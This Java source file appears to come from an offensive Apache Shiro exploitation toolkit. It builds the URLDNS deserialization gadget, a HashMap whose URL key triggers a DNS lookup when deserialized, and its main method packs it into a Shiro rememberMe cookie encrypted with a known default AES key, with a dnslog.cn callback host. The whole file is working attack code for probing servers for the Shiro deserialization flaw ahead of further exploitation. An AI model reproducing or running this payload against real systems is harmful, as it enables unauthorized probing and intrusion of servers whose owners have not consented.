package com.liev.clouds.payload.shiro;


import com.liev.clouds.annotation.Authors;
import com.liev.clouds.annotation.Dependencies;
import com.liev.clouds.annotation.PayloadTest;
import com.liev.clouds.exp.shiro.AttackService;
import com.liev.clouds.utils.shiroutils.ReflectionsUtils;
import com.liev.clouds.utils.shiroutils.Shiro;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;


@PayloadTest(skip = "true")
@Dependencies
@Authors({"GEBL"})
public class URLDNS {
    public URLDNS() {
    }

    public Object getObject(String url) throws Exception {
        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap ht = new HashMap();
        URL u = new URL((URL)null, url, handler);
        ht.put(u, url);
        ReflectionsUtils.setFieldValue(u, "hashCode", -1);
        return ht;
    }

    public static void main(String[] args) throws Exception {
        Object dnslog = (new URLDNS()).getObject("http://c996hs.dnslog.cn");
        Shiro shiro = new Shiro();
        AttackService.aesGcmCipherType = 1;
        String sendpayload = shiro.sendpayload(dnslog, "rememberMe", "4AvVhmFLUs0KTA3Kprsdag==");
        System.out.println(sendpayload);
    }

    static class SilentURLStreamHandler extends URLStreamHandler {
        SilentURLStreamHandler() {
        }

        @Override
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        @Override
        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}

